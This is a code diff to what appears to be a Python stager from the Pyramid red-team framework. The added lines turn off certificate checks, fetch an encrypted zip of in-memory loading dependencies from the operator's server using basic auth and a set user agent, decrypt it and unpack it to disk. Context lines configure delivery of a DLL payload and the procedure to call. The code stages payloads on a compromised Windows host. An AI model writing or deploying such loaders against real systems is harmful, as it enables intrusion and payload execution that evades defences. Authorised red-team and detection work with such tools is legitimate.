@@ -61,6 +61,11 @@ URI_dll_delivery='https://192.168.1.2/example.dll' # only needed if use_pyramid_
 dll_name = 'example.dll'
 dll_procedure='StartW' # dll procedure name to be called for dll execution - know your payload!
 
+### GENERAL CONFIG ####
+
+### Directory to which extract dependencies
+### setting to false extract to current directory
+extraction_dir=False
 
 #### DO NOT CHANGE BELOW THIS LINE #####
 
@@ -318,6 +323,34 @@ for zip_name in zip_list:
         print(e)
 
 print("[*] Modules imported")
+
+cwd=os.getcwd()
+
+if not extraction_dir:
+	extraction_dir=cwd
+	
+sys.path.insert(1,extraction_dir)
+
+### separator --- is used by Pyramid server to look into the specified folder
+
+zip_name='pythonmemorymodule---windows'
+print("[*] Downloading and unpacking on disk dependencies on dir {}".format(extraction_dir))
+gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+gcontext.check_hostname = False
+gcontext.verify_mode = ssl.CERT_NONE
+request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
+          base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
+          headers={'User-Agent': user_agent})
+base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
+request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
+with urllib.request.urlopen(request, context=gcontext) as response:
+   zip_web = response.read()
+
+print("[*] Decrypting received file")   
+zip_web= encrypt_wrapper(zip_web, encryption)
+
+with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
+    zip_ref.extractall(extraction_dir)
 
 
 ##### PythonMemoryModule launcher #####
